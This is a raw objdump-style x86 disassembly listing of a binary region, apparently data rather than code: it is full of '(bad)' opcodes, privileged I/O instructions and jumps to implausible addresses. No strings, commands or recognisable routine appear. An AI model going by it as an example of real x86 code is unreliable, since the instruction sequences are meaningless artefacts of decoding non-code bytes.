  4242f5:	ror    DWORD PTR [esi],cl
  4242f7:	int    0x4d
  4242f9:	add    dh,ah
  4242fb:	mov    edx,0xdfbf438b
  424300:	int    0x13
  424302:	in     eax,dx
  424303:	leave  
  424304:	dec    edi
  424305:	xchg   ebp,eax
  424306:	out    0xae,eax
  424308:	jmp    FWORD PTR [ecx]
  42430a:	jmp    0xeec96e4b
  42430f:	sub    eax,0x0
	...
  42432c:	add    BYTE PTR [eax],al
  42432e:	adc    DWORD PTR [ebx-0x3f72a7dd],ecx
  424334:	loop   0x42436a
  424336:	frstor [edi-0x628d3363]
  42433c:	jno    0x42435f
  42433e:	adc    eax,0x96060131
  424343:	inc    ebx
  424344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424345:	xor    al,0x65
  424347:	and    DWORD PTR ss:[ebx+0x19a68451],esp
  42434e:	sbb    bl,BYTE PTR [ebp+0x602abbfb]
  424354:	sahf   
  424355:	add    al,0xd
  424357:	shl    BYTE PTR [esi],cl
  424359:	inc    ebx
  42435a:	sar    DWORD PTR [eax],cl
  42435c:	xor    dh,al
  42435e:	push   cs
  42435f:	add    BYTE PTR ds:0xeff2449,ch
  424365:	inc    ecx
  424366:	and    BYTE PTR ds:0x8e46c,cl
  42436c:	out    0x29,eax
  42436e:	xchg   esp,eax
  42436f:	inc    edx
  424370:	add    BYTE PTR [ecx],ch
  424372:	xchg   edx,eax
  424373:	adc    eax,ebx
  424375:	(bad)  
  424376:	mov    DWORD PTR [edx+0x2],eax
  424379:	not    BYTE PTR [edx+eax*2-0x3d]
  42437d:	mov    cl,0xff
  42437f:	cmp    DWORD PTR [edi+0x48000eec],0xffffffde
  424386:	xchg   edx,eax
  424387:	out    dx,al
  424388:	add    ch,cl
  42438a:	push   cs
  42438b:	dec    eax
  42438c:	je     0x42437e
  42438e:	aam    0x41
  424390:	cmc    
  424391:	out    dx,al
	...
  4243ae:	add    BYTE PTR [eax],al
  4243b0:	jno    0x424345
  4243b2:	add    ch,cl
  4243b4:	push   cs
  4243b5:	pop    eax
  4243b6:	jg     0x4243a1
  4243b8:	push   cs
  4243b9:	add    BYTE PTR [edi+0x42864124],al
  4243bf:	test   DWORD PTR [ebp+0x41],edi
  4243c2:	mov    al,0x39
  4243c4:	jl     0x424347
  4243c6:	sub    eax,esi
  4243c8:	outs   dx,DWORD PTR ds:[esi]
  4243c9:	fwait
  4243ca:	dec    edi
  4243cb:	push   ss
  4243cc:	scas   al,BYTE PTR es:[edi]
  4243cd:	icebp  
  4243ce:	jecxz  0x4243ac
  4243d0:	into   
  4243d1:	inc    DWORD PTR [edx-0x287ee057]
  4243d7:	in     eax,dx
  4243d8:	push   cs
  4243d9:	add    BYTE PTR [ebx-0x74b322dc],cl
  4243df:	ins    BYTE PTR es:[edi],dx
  4243e0:	pop    edx
  4243e1:	cwde   
  4243e2:	cld    
  4243e3:	mov    ds,WORD PTR [esi]
  4243e5:	xor    edi,ebp
  4243e7:	fsub   QWORD PTR [edx-0x6a16c00f]
  4243ed:	pop    esp
  4243ee:	or     al,0x6c
  4243f0:	lods   al,BYTE PTR ds:[esi]
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	jmp    0x15fcc2dc
  4243f8:	outs   dx,BYTE PTR ds:[esi]
  4243f9:	fwait
  4243fa:	cld    
  4243fb:	div    ah
  4243fd:	test   BYTE PTR [edx-0x36491f9],al
  424403:	aam    0xa
  424405:	test   DWORD PTR [edx-0x49ea000],ebx
  42440b:	(bad)  
  42440c:	jge    0x42438e
  42440e:	sub    al,0xff
  424410:	cmp    ebx,DWORD PTR [esi-0x77]
  424413:	mov    ch,0x0
	...
  424431:	add    al,bh
  424433:	pop    esi
  424434:	sti    
  424435:	call   FWORD PTR [edi+edx*1]
  424438:	pop    edx
  424439:	dec    DWORD PTR [ebx]
  42443b:	mov    WORD PTR [ecx-0x18],es
  42443e:	ja     0x4244b7
  424440:	sti    
  424441:	pshufw mm1,QWORD PTR [ebp-0x181c0000],0xfe
  424449:	push   DWORD PTR [ebp-0x44f79601]
  42444f:	mov    bl,0xd4
  424451:	(bad)  
  424452:	addr16 (bad) 
  424454:	cli    
  424455:	adc    eax,0x3c8f00
  42445a:	pop    ds
  42445b:	jl     0x424494
  42445d:	sti    
  42445e:	inc    ecx
  42445f:	pop    es
  424460:	mov    BYTE PTR [ebp-0x3d],0xff
  424464:	in     al,0x60
  424466:	mov    al,ds:0x41feffff
  42446b:	xchg   DWORD PTR fs:[ebp+0x6c],esi
  42446f:	aam    0xfa
  424471:	jne    0x4244bf
  424473:	(bad)  
  424474:	out    0x8d,eax
  424476:	scas   eax,DWORD PTR es:[edi]
  424477:	popa   
  424478:	sti    
  424479:	sub    DWORD PTR [edi+edi*8+0x347850a],0x0
  424481:	add    bh,ch
  424483:	inc    edx
  424484:	call   0xfb925e0c
  424489:	cmp    DWORD PTR [ecx-0x4400055d],0x60
  424490:	test   DWORD PTR [ebp-0x6c],ebx
  424493:	xchg   DWORD PTR [ecx-0x24],ebx
	...
  4244b2:	add    BYTE PTR [eax],al
  4244b4:	mov    ebp,0xb1c7e3da
  4244b9:	xchg   edi,eax
  4244ba:	cli    
  4244bb:	dec    DWORD PTR ds:0xd000632
  4244c1:	test   eax,0x42f5b289
  4244c6:	lahf   
  4244c7:	cld    
  4244c8:	xchg   esp,eax
  4244c9:	and    eax,DWORD PTR [eax]
  4244cb:	inc    BYTE PTR [edx]
  4244cd:	shr    BYTE PTR [eax+0xa90edd],cl
  4244d3:	std    
  4244d4:	js     0x424467
  4244d6:	lea    eax,[edx-0x36104ff]
  4244dc:	cmc    
  4244dd:	stc    
  4244de:	cmp    edi,ebp
  4244e0:	fisub  DWORD PTR [esp+eax*8]
  4244e3:	jae    0x4244da
  4244e5:	jne    0x42450f
  4244e7:	std    
  4244e8:	retf   0xa8
  4244eb:	push   ebp
  4244ec:	ret    0x91b
  4244ef:	std    
  4244f0:	and    cl,cl
  4244f2:	idiv   BYTE PTR [edi]
  4244f4:	or     eax,0x9b0cc12c
  4244f9:	imul   eax,DWORD PTR [ebx],0x0
  4244fc:	or     eax,0x88e815b2
  424501:	and    esi,ebp
  424503:	std    
  424504:	xchg   edx,eax
  424505:	rol    edi,0x42
  424508:	jge    0x424532
  42450a:	add    DWORD PTR [eax],eax
  42450c:	or     eax,0x7a57c6c1
  424511:	imul   eax,DWORD PTR [edi+edi*4+0x1622d02],0x0
	...
  424534:	add    BYTE PTR [eax],al
  424536:	or     eax,0x5d428da9
  42453b:	fmul   DWORD PTR [edx+eax*4-0x36075d7]
  424542:	mov    ebp,0x4afd2bf5
  424547:	test   al,0x0
  424549:	push   ebp
  42454a:	inc    edx
  42454b:	fwait
  42454c:	test   al,0xfc
  42454e:	and    BYTE PTR [ecx+0xd3ff5],al
  424554:	jb     0x4244e9
  424556:	xchg   ebx,eax
  424557:	adc    al,0x33
  424559:	fcomp  QWORD PTR ds:0xd8b650a
  42455f:	add    bh,ah
  424561:	test   BYTE PTR [eax],dl
  424563:	add    esi,esi
  424565:	test   DWORD PTR [edx-0x2],edi
  424568:	out    0x3,al
  42456a:	imul   eax,DWORD PTR [ebp-0x66061095],0x2d
  424571:	sub    DWORD PTR [edx],edi
  424573:	cmp    edx,0xffffff9f
  424576:	jmp    0x46c93314
  42457b:	(bad)  
  42457c:	out    0x3,al
  42457e:	jae    0x4245fd
  424580:	push   cs
  424581:	add    eax,0x86720a5e
  424586:	and    bl,BYTE PTR [ebp+edi*8-0x497cfa61]
  42458d:	mov    al,ds:0xfc0199b9
  424592:	sub    BYTE PTR [ebp-0x22],bh
  424595:	neg    DWORD PTR [edi]
  424597:	cmc    
  424598:	push   eax
  424599:	hlt    
	...
  4245b6:	add    BYTE PTR [eax],al
  4245b8:	xchg   edi,eax
  4245b9:	sbb    DWORD PTR [edx],0xffffff9f
  4245bc:	cdq    
  4245bd:	cdq    
  4245be:	pop    ebx
  4245bf:	xchg   ecx,eax
  4245c0:	neg    BYTE PTR [ebx-0x748d603b]
  4245c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245c7:	add    al,0xd
  4245c9:	and    DWORD PTR [esi-0x171e71f1],0x3
  4245d0:	or     eax,0xd022580
  4245d5:	or     DWORD PTR [ecx+eax*1+0xf],esp
  4245d9:	add    bh,ah
  4245db:	and    eax,0x88ddf922
  4245e0:	(bad)  
  4245e1:	std    
  4245e2:	out    0x3,al
  4245e4:	add    bh,BYTE PTR [ebx]
  4245e6:	sbb    DWORD PTR [ecx],0xffffffff
  4245e9:	cwde   
  4245ea:	(bad)  
  4245eb:	sti    
  4245ec:	sahf   
  4245ed:	xchg   BYTE PTR [edx-0x3636c43],al
  4245f3:	mov    ecx,0x5c937e7d
  4245f8:	sbb    BYTE PTR [edi+ecx*2-0x3cb4bf],0xe8
  424600:	call   0xaca00083
  424605:	fwait
  424606:	cld    
  424607:	(bad)  
  424608:	and    eax,0x7d54870c
  42460d:	xchg   esi,eax
  42460e:	cld    
  42460f:	xor    BYTE PTR cs:[ebp-0x69],0x24
  424614:	mov    bl,BYTE PTR [ebx-0x7e815b78]
  42461a:	inc    edx
  42461b:	or     eax,0x0
	...
  424638:	add    BYTE PTR [eax],al
  42463a:	sub    DWORD PTR [eax-0x7af11701],eax
  424640:	adc    ch,0xab
  424643:	fwait
  424644:	cld    
  424645:	call   0xd8c0:0x99129afe
  42464c:	(bad)  
  42464d:	fstp   QWORD PTR [eax+0x44]
  424650:	add    DWORD PTR [edx-0x2e],ebp
  424653:	add    al,0x48
  424655:	out    dx,al
  424656:	mov    cl,BYTE PTR [edi+edi*8+0x48480ee8]
  42465d:	push   ebp
  42465e:	mov    bh,0x40
  424660:	or     eax,0xfc99e16c
  424665:	jmp    0xe657e0f9
  42466a:	mov    BYTE PTR [eax-0x2],ah
  42466d:	call   0x41576c80
  424672:	xor    eax,DWORD PTR [ecx-0x647c327e]
  424678:	cld    
  424679:	add    esp,DWORD PTR [ecx-0x7b]
  42467c:	inc    esp
  42467d:	in     eax,0x1e
  42467f:	test   DWORD PTR [edx-0x4867800],eax
  424685:	jmp    DWORD PTR [ecx+eax*8]
  424688:	inc    ecx
  424689:	lock pusha 
  42468b:	cld    
  42468c:	(bad)  
  42468d:	dec    DWORD PTR [esi+edx*8-0x19cbff3b]
  424694:	adc    ebp,ecx
  424696:	enter  0xfffc,0xff
  42469a:	scas   al,BYTE PTR es:[edi]
  42469b:	inc    ecx
  42469c:	add    al,0x84
	...
  4246ba:	add    BYTE PTR [eax],al
  4246bc:	in     al,0x9
  4246be:	test   BYTE PTR [ebx-0xb],dh
  4246c1:	add    eax,DWORD PTR [eax]
  4246c3:	(bad)  
  4246c5:	ret    
  4246c6:	mov    DWORD PTR [eax-0x15],ecx
  4246c9:	mov    edx,0xe8520fed
  4246ce:	cld    
  4246cf:	push   esp
  4246d1:	ror    DWORD PTR [eax-0x773316b1],cl
  4246d7:	lea    ebx,[eax+0x77]
  4246da:	sti    
  4246db:	call   DWORD PTR [ebp-0x4b39da95]
  4246e1:	add    eax,esi
  4246e3:	test   BYTE PTR [ecx-0x3c0006f1],ch
  4246e9:	add    cl,BYTE PTR [ecx-0x434d56a8]
  4246ef:	(bad)  
  4246f0:	loope  0x4246a1
  4246f2:	dec    ebp
  4246f3:	push   eax
  4246f4:	in     al,0x8a
  4246f6:	inc    ecx
  4246f7:	int3   
  4246f8:	xor    DWORD PTR [edi-0x70],edi
  4246fb:	cld    
  4246fc:	ret    
  4246fd:	jne    0x42474b
  4246ff:	jmp    FWORD PTR [ecx+0x4f]
  424702:	adc    DWORD PTR [eax+0x74],eax
  424705:	jle    0x4246c3
  424707:	psubsw mm5,QWORD PTR [edx-0x4e9b0003]
  42470e:	into   
  42470f:	xor    ecx,DWORD PTR [edx+0x6fcc4189]
  424715:	mov    ebp,0x9e0d1370
  42471a:	push   edx
  42471b:	leave  
  42471c:	xchg   ch,dh
  42471e:	mov    WORD PTR [edi+0x0],?
	...
  42473c:	add    BYTE PTR [eax],al
  42473e:	add    al,0xd1
  424740:	pop    es
  424741:	je     0x424761
  424743:	adc    al,BYTE PTR [esp+ebx*1-0xa]
  424747:	data16 adc al,0xf4
  42474a:	xor    ebp,DWORD PTR [ebx-0x7d]
  42474d:	stc    
  42474e:	btc    DWORD PTR [ebx+0xa922e6],edi
  424755:	add    BYTE PTR [esi-0x7bb10f9f],al
  42475b:	je     0x4246ed
  42475d:	cld    
  42475e:	jge    0x424701
  424760:	lea    eax,[edx-0x36529cf]
  424766:	pop    ebp
  424767:	inc    ecx
  424768:	pop    esi
  424769:	ret    0xa90d
  42476c:	and    al,BYTE PTR [ecx-0x3645358]
  424772:	loop   0x424701
  424774:	adc    eax,0x4833840c
  424779:	std    
  42477a:	rol    BYTE PTR ds:0xfdfdb289,cl
  424780:	call   0x20fc:0xcd0bc2fc
  424787:	mov    ebp,0x20d3ff2
  42478c:	jmp    0x42470e
  42478e:	stos   DWORD PTR es:[edi],eax
  42478f:	xchg   edx,eax
  424790:	or     ecx,DWORD PTR [esi+0xa862]
  424796:	daa    
  424797:	stos   DWORD PTR es:[edi],eax
  424798:	cmp    BYTE PTR [esi-0x7c],ah
  42479b:	sbb    ebp,ebp
  42479d:	cld    
  42479e:	mov    bh,BYTE PTR [ebp+0x426]
	...
  4247c0:	nop
  4247c1:	fld    QWORD PTR [edi]
  4247c3:	push   eax
  4247c4:	mov    BYTE PTR [ebx],ah
  4247c6:	sar    esp,1
  4247c8:	jb     0x42482f
  4247ca:	xor    ch,al
  4247cc:	sar    bh,1
  4247ce:	xchg   esi,eax
  4247cf:	repz bound edx,QWORD PTR [esi-0x4314541a]
  4247d6:	out    0x3,al
  4247d8:	out    0x7,eax
  4247da:	xor    ah,BYTE PTR [esi]
  4247dc:	xchg   esp,eax
  4247dd:	sti    
  4247de:	in     eax,0x80
  4247e0:	dec    ebp
  4247e1:	add    DWORD PTR [edx+0x1e],ebp
  4247e4:	sub    DWORD PTR [esi-0x1a7074f4],edx
  4247ea:	ins    DWORD PTR es:[edi],dx
  4247eb:	pushf  
  4247ec:	sub    DWORD PTR [esp+edi*4],ecx
  4247ef:	sub    ecx,DWORD PTR [ebp-0x79fc1901]
  4247f5:	jl     0x4247f1
  4247f7:	sahf   
  4247f8:	adc    DWORD PTR [esi-0x6aa2fc40],edx
  4247fe:	(bad)  [ebx]
  424800:	sbb    eax,DWORD PTR [eax-0x19]
  424803:	and    eax,0x9d027b84
  424808:	icebp  
  424809:	xchg   ebp,eax
  42480a:	les    ecx,FWORD PTR [edx-0x63dc1371]
  424810:	loope  0x424817
  424812:	push   esi
  424813:	ret    
  424814:	lea    edi,[edx+eiz*8+0xbec9f8e]
  42481b:	pushf  
  42481c:	leave  
  42481d:	xchg   DWORD PTR [ebx-0x5f815541],ebp
  424823:	pushf  
	...
  424840:	add    BYTE PTR [eax],al
  424842:	mov    ecx,0x8dafab87
  424847:	cwde   
  424848:	in     eax,dx
  424849:	or     edx,DWORD PTR [ecx+0xd03e832]
  42484f:	shl    DWORD PTR [esi-0x24be879],1
  424855:	or     bh,BYTE PTR [esi-0x40]
  424858:	push   ds
  424859:	xchg   DWORD PTR [edx+0x4],ebp
  42485c:	push   0xffffffc4
  42485e:	adc    al,0x87
  424860:	and    esi,DWORD PTR [ebx+eax*2+0x179d0033]
  424867:	out    0xc,eax
  424869:	jbe    0x4247f7
  42486b:	jmp    0xcec8ef6c
  424870:	inc    edx
  424871:	mov    ebp,0x1cfcf2fc
  424876:	jns    0x424802
  424878:	cmp    BYTE PTR [ebp+0x19fc94a7],0x92
  42487f:	inc    edx
  424880:	aam    0x13
  424882:	adc    edi,esp
  424884:	rcr    BYTE PTR [ecx],0x84
  424887:	add    DWORD PTR ds:0xec128619,ebx
  42488d:	data16 sbb al,0xb5
  424890:	adc    ch,BYTE PTR [ecx+0x457a7f0e]
  424896:	jbe    0x42489c
  424898:	test   BYTE PTR [edi+0x46000011],cl
  42489e:	sbb    al,0xa4
  4248a0:	mov    ah,BYTE PTR [ebp+edi*8-0x6e]
  4248a4:	cld    
  4248a5:	add    BYTE PTR ss:[eax],al
	...
  4248c4:	mov    eax,ds:0x862e5601
  4248c9:	cmp    BYTE PTR [edi-0xa29d0a],0xe8
  4248d0:	push   cs
  4248d1:	xchg   DWORD PTR [edx+0x39],esi
  4248d4:	test   BYTE PTR [ecx-0x10],al
  4248d7:	mov    ecx,0x62b8195
  4248dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248dd:	xchg   ebx,eax
  4248de:	dec    edi
  4248df:	mov    edx,0xf6b82f7b
  4248e4:	xchg   edi,eax
  4248e5:	xchg   esp,eax
  4248e6:	cld    
  4248e7:	ret    0x44cc
  4248ea:	mov    ebp,ebp
  4248ec:	mov    edi,0x6554fd44
  4248f1:	xchg   ebx,eax
  4248f2:	adc    al,cl
  4248f4:	popf   
  4248f5:	aam    0xff
  4248f7:	adc    DWORD PTR [edx+0x13],edx
  4248fa:	or     al,0x0
  4248fc:	jnp    0x42492f
  4248fe:	mov    ch,BYTE PTR [ebx+edi*4]
  424901:	jns    0x4248fe
  424903:	cmp    DWORD PTR [ecx],ebp
  424905:	pop    eax
  424906:	jno    0x42497c
  424908:	addr16 ret 
  42490a:	bound  ecx,QWORD PTR [ecx+0x24b885b]
  424910:	adc    bh,BYTE PTR [ebp-0x47]
  424913:	sub    al,0x7b
  424915:	jns    0x424912
  424917:	pop    ss
  424918:	imul   ecx,DWORD PTR [edi],0xffffffbe
  42491b:	(bad)  
  42491c:	jge    0x42489e
  42491e:	fld    QWORD PTR [ebx]
  424920:	mov    edx,0x987d7fbb
  424925:	xchg   ecx,eax
  424926:	test   BYTE PTR [edi+0x0],cl
	...
  424945:	add    BYTE PTR [edi],dh
  424947:	out    dx,eax
  424948:	or     DWORD PTR [edx+0x24],ebp
  42494b:	xchg   DWORD PTR [ecx-0x48644cc],ecx
  424951:	jmp    0x42497d
  424953:	jge    0x4249ce
  424955:	fdivr  st(6),st
  424957:	lock cmp al,0x6a
  42495a:	lock mov BYTE PTR [ecx-0x489c4d0],cl
  424961:	push   ecx
  424962:	imul   eax,DWORD PTR [esi+0x4],0xc0b54c51
  424969:	add    ah,dh
  42496b:	in     eax,0x1
  42496d:	lea    ebp,[ecx-0x57]
  424970:	sti    
  424971:	(bad)  
  424972:	sti    
  424973:	retf   
  424974:	mov    BYTE PTR [ebx+eiz*8+0x79],cl
  424978:	dec    ebp
  424979:	call   0x3e9d51
  42497e:	mov    ebx,0x298de403
  424983:	and    edi,edx
  424985:	(bad)  
  424986:	mov    ebx,0x72034ecf
  42498b:	int3   
  42498c:	push   edx
  42498d:	inc    DWORD PTR [ecx+0x64]
  424990:	sti    
  424991:	adc    eax,0x3fecc90d
  424996:	or     eax,0x663105be
  42499b:	push   cs
  42499c:	cmp    eax,0x82503eec
  4249a1:	div    DWORD PTR [edx-0x66]
  4249a4:	ins    DWORD PTR es:[edi],dx
  4249a5:	mov    esi,0xfde41c94
	...
  4249c6:	add    BYTE PTR [eax],al
  4249c8:	bound  ebx,QWORD PTR [edx-0x7e]
  4249cb:	mov    esi,0x1385100f
  4249d0:	push   ebx
  4249d1:	push   0xffffff96
  4249d3:	mov    al,bl
  4249d5:	mov    al,ds:0x7b258a89
  4249da:	xchg   esi,eax
  4249db:	cld    
  4249dc:	xchg   ah,ah
  4249de:	stos   DWORD PTR es:[edi],eax
  4249df:	xchg   BYTE PTR [eax+0x2afc96ad],al
  4249e5:	div    BYTE PTR [edx]
  4249e7:	push   ecx
  4249e8:	nop
  4249e9:	and    al,0xf0
  4249eb:	std    
  4249ec:	sbb    dh,BYTE PTR [edx]
  4249ee:	xor    al,0x51
  4249f0:	adc    dl,BYTE PTR [eax+esi*4+0x7da94d12]
  4249f7:	mov    edi,0xfc090a12
  4249fc:	cli    
  4249fd:	ror    DWORD PTR [edx+0xe40e172],1
  424a03:	push   edi
  424a04:	jmp    0x96e0:0x8e0daae1
  424a0b:	jb     0x424a20
  424a0d:	fstp   TBYTE PTR [esi*8-0x77fd01f4]
  424a14:	push   0x31e82eee
  424a19:	out    0x3,al
  424a1b:	add    BYTE PTR [esi-0x471956f5],al
  424a21:	test   al,0x0
  424a23:	add    bl,dl
  424a25:	pop    ebx
  424a26:	(bad)  
  424a27:	(bad)  
  424a28:	mov    ch,0xff
  424a2a:	xlat   BYTE PTR ds:[ebx]
  424a2b:	add    eax,DWORD PTR [eax]
	...
  424a49:	add    BYTE PTR ds:0x28c41a00,cl
  424a4f:	jg     0x424a65
  424a51:	icebp  
  424a52:	lock mov BYTE PTR [esi+eax*1],ah
  424a56:	inc    BYTE PTR [ecx+edx*2]
  424a59:	hlt    
  424a5a:	xchg   DWORD PTR [ecx],edi
  424a5c:	out    dx,eax
  424a5d:	xor    esp,DWORD PTR [ebp-0x28]
  424a60:	stos   BYTE PTR es:[edi],al
  424a61:	add    ecx,DWORD PTR ds:0xc08ae9a7
  424a67:	sti    
  424a68:	jno    0x424a2b
  424a6a:	jb     0x424ac3
  424a6c:	xor    al,0x99
  424a6e:	push   ecx
  424a6f:	xchg   BYTE PTR [esi+0x69afbf8a],dl
  424a75:	cdq    
  424a76:	inc    ecx
  424a77:	add    ch,BYTE PTR [ebx+0x7f]
  424a7a:	cmp    dl,BYTE PTR [edx-0x6040671a]
  424a80:	sbb    DWORD PTR [edx],esi
  424a82:	shl    BYTE PTR [edi-0x6dde6e8a],0x71
  424a89:	fwait
  424a8a:	lea    edx,[edx-0x7b3bf119]
  424a90:	stos   DWORD PTR es:[edi],eax
  424a91:	or     ebx,DWORD PTR [ebp-0x7d]
  424a94:	mov    ds:0xc9a852b3,eax
  424a99:	cmp    edi,eax
  424a9b:	xchg   ecx,eax
  424a9c:	jno    0x424aac
  424a9e:	fld    QWORD PTR [ebp-0x539875d2]
  424aa4:	cmp    DWORD PTR ds:[edx],0xd9842591
  424aab:	xchg   ecx,eax
  424aac:	xchg   edx,eax
  424aad:	outs   dx,BYTE PTR ds:[esi]
	...
  424aca:	add    BYTE PTR [eax],al
  424acc:	cmp    DWORD PTR [eax+0xd15e4],ebp
  424ad2:	bound  edi,QWORD PTR [esi]
  424ad4:	lods   eax,DWORD PTR ds:[esi]
  424ad5:	jge    0x424b05
  424ad7:	add    eax,0x98962d5d
  424adc:	aas    
  424add:	or     BYTE PTR [eax],al
  424adf:	add    DWORD PTR [ecx-0x75],eax
  424ae2:	cld    
  424ae3:	out    dx,al
  424ae4:	xchg   esi,eax
  424ae5:	mov    DWORD PTR [eax+0x90d10e6],eax
  424aeb:	fdivp  st(4),st
  424aed:	stos   DWORD PTR es:[edi],eax
  424aee:	mov    BYTE PTR [ecx+ebx*1],dh
  424af1:	test   al,0xae
  424af3:	aaa    
  424af4:	call   0x4f99:0xbd3c8894
  424afb:	and    DWORD PTR [edx-0x7d497f6c],ebx
  424b01:	add    al,0x84
  424b03:	adc    bh,BYTE PTR [edx-0x6c]
  424b06:	cld    
  424b07:	push   0xffffff82
  424b09:	xchg   edx,eax
  424b0a:	jo     0x424b45
  424b0c:	xchg   ebx,eax
  424b0d:	ds stc 
  424b0f:	jmp    0x8fcb928b
  424b14:	jno    0x424ae6
  424b16:	push   edx
  424b17:	xchg   BYTE PTR [edx-0x64951078],ah
  424b1d:	xchg   esp,eax
  424b1e:	jb     0x424b0f
  424b20:	push   0x77e4f53e
  424b25:	retf   
  424b26:	push   ebp
  424b27:	push   ecx
  424b28:	mov    esp,0x7be90021
  424b2d:	push   cs
  424b2e:	loopne 0x424aea
	...
  424b4c:	add    BYTE PTR [eax],al
  424b4e:	cmp    BYTE PTR [ebx+0x32b6e172],dl
  424b54:	test   BYTE PTR [esi-0x5e],0x7f
  424b58:	imul   eax
  424b5a:	sbb    eax,0x16948907
  424b5f:	sub    ch,al
  424b61:	leave  
  424b62:	xor    BYTE PTR [ebx+0x7f1312fc],dl
  424b68:	neg    DWORD PTR [esi]
  424b6a:	cld    
  424b6b:	stc    
  424b6c:	lds    ebp,FWORD PTR [ebx+ebx*4-0x6915166f]
  424b73:	xor    eax,0x6e1c00f9
  424b78:	push   ebx
  424b79:	push   DWORD PTR [ebx+0xcd87169]
  424b7f:	faddp  st(1),st
  424b81:	add    BYTE PTR [esi+eax*4-0x50f04bf],dh
  424b88:	or     al,BYTE PTR [ebp-0x48c93]
  424b8e:	hlt    
  424b8f:	div    edx
  424b91:	add    BYTE PTR [ebx+0x10],ah
  424b94:	lods   al,BYTE PTR ds:[esi]
  424b95:	stc    
  424b96:	push   ebx
  424b97:	imul   edi,ebx,0x71694475
  424b9d:	test   esi,0x6c75fb68
  424ba3:	fs or  dh,dh
  424ba6:	mov    bl,0x69
  424ba8:	add    eax,0xe9bd0f63
  424bae:	leave  
  424baf:	jae    0x424bac
  424bb1:	inc    DWORD PTR [eax]
	...
  424bcf:	add    cl,bh
  424bd1:	test   al,ch
  424bd3:	and    DWORD PTR [eax+0x207d7f9c],0x69
  424bda:	jo     0x424c17
  424bdc:	stos   BYTE PTR es:[edi],al
  424bdd:	aas    
  424bde:	adc    al,0x2
  424be0:	sar    DWORD PTR [edi],0xfc
  424be3:	push   eax
  424be4:	mov    eax,ds:0xb350e43f
  424be9:	out    dx,eax
  424bea:	or     eax,edi
  424bec:	mov    ecx,0xf4000c77
  424bf1:	add    esi,DWORD PTR [edi+ecx*1+0x53]
  424bf5:	nop
  424bf6:	call   0x8145f010
  424bfb:	shr    BYTE PTR [eax+0x33c87ef8],0x5a
  424c02:	cmp    edi,edi
  424c04:	fldcw  WORD PTR [edi+0x11]
  424c07:	inc    eax
  424c08:	in     al,0x5a
  424c0a:	jmp    0x424b97
  424c0c:	or     eax,0x4886a85c
  424c11:	icebp  
  424c12:	sbb    cl,BYTE PTR [ecx+0x5a9ff50]
  424c18:	mov    es,WORD PTR [eax+ebx*4+0x1ad8dfff]
  424c1f:	xchg   DWORD PTR [eax-0x69],ecx
  424c22:	xchg   DWORD PTR [edx-0x3],eax
  424c25:	adc    BYTE PTR ds:0x859127f3,bh
  424c2b:	inc    edx
  424c2c:	or     ecx,0x67157292
  424c32:	cmp    al,0xf4
	...
  424c50:	add    BYTE PTR [eax],al
  424c52:	or     eax,0x7253d1b1
  424c57:	dec    esi
  424c58:	into   
  424c59:	(bad)  
  424c5a:	xchg   ecx,eax
  424c5b:	pop    ecx
  424c5c:	add    dl,BYTE PTR [ebx-0x393eddb4]
  424c62:	dec    edi
  424c63:	mov    DWORD PTR [eax],eax
  424c65:	push   ebx
  424c66:	xchg   BYTE PTR [ebp-0x80],bh
  424c69:	jmp    0x424c70
  424c6b:	cwde   
  424c6c:	add    BYTE PTR [eax],al
  424c6e:	fisub  WORD PTR [ecx]
  424c70:	xor    eax,0x2eede308
  424c75:	call   0x463fda
  424c7a:	ficomp WORD PTR [edi-0x29]
  424c7d:	add    DWORD PTR [edx],edx
  424c7f:	xor    eax,0x4f2330c1
  424c84:	es add eax,0x4f9c6480
  424c8a:	xchg   esi,eax
  424c8b:	xor    DWORD PTR [ecx-0x23bf0eb6],ecx
  424c91:	push   eax
  424c92:	cli    
  424c93:	inc    ebp
  424c94:	cmp    BYTE PTR [edi-0x40316188],0xf4
  424c9b:	jle    0x424c9d
  424c9d:	add    BYTE PTR ds:0xdf91519,cl
  424ca3:	add    BYTE PTR [ebx-0x4b757a11],bl
  424ca9:	sub    edx,ecx
  424cab:	jnp    0x424c58
  424cad:	cwde   
  424cae:	push   edx
  424caf:	cwde   
  424cb0:	out    dx,eax
  424cb1:	xor    BYTE PTR [eax+0xc46a8e],bh
	...
  424cd3:	add    BYTE PTR [edi],bh
  424cd5:	cwde   
  424cd6:	adc    DWORD PTR [ebp-0x76f1c36b],esi
  424cdc:	arpl   sp,sp
  424cde:	out    0x3,al
  424ce0:	cwde   
  424ce1:	push   DWORD PTR [ecx-0x4e]
  424ce4:	push   ebx
  424ce5:	cdq    
  424ce6:	test   BYTE PTR [eax],0x4f
  424ce9:	jp     0x424ca2
  424ceb:	sub    BYTE PTR [edi+edi*8-0x33],0x3
  424cf0:	or     eax,0x5f3c7c1
  424cf5:	mov    cl,0xa7
  424cf7:	stos   DWORD PTR es:[edi],eax
  424cf8:	adc    al,cl
  424cfa:	enter  0x140b,0xc2
  424cfe:	push   ds
  424cff:	mov    esi,0xd74096cf
  424d04:	push   eax
  424d05:	jmp    esi
  424d07:	add    ebx,DWORD PTR [eax]
  424d09:	xchg   DWORD PTR [edx+0x3],ebp
  424d0c:	or     eax,0xa7040100
  424d11:	add    BYTE PTR [esi+edi*1+0x34],dh
  424d15:	das    
  424d16:	jb     0x424cb0
  424d18:	xor    bh,BYTE PTR [ebp-0x7cde6ae8]
  424d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d1f:	jae    0x8adaf89e
  424d25:	adc    DWORD PTR [ebx],0xffffffc8
  424d28:	or     BYTE PTR [esi+0x14c27f55],cl
  424d2e:	fnstsw WORD PTR ds:0x3458e7a
  424d34:	or     eax,0xadbd00
	...
  424d55:	add    bl,dh
  424d57:	or     al,BYTE PTR [eax]
  424d59:	ss jns 0x424ce8
  424d5c:	mov    ah,BYTE PTR [esi+edi*2+0x2126313d]
  424d63:	xor    ecx,DWORD PTR [ebx-0x3742d9c]
  424d69:	push   ss
  424d6a:	inc    BYTE PTR [edx+edi*2-0x2c0d5ee7]
  424d71:	fmul   QWORD PTR [esi+0x0]
  424d74:	sub    DWORD PTR [ecx],0x1a
  424d77:	push   es
  424d78:	(bad)  
  424d79:	lods   al,BYTE PTR ds:[esi]
  424d7a:	xchg   ecx,eax
  424d7b:	sub    cl,ch
  424d7d:	mov    edx,0xd2f01285
  424d82:	nop
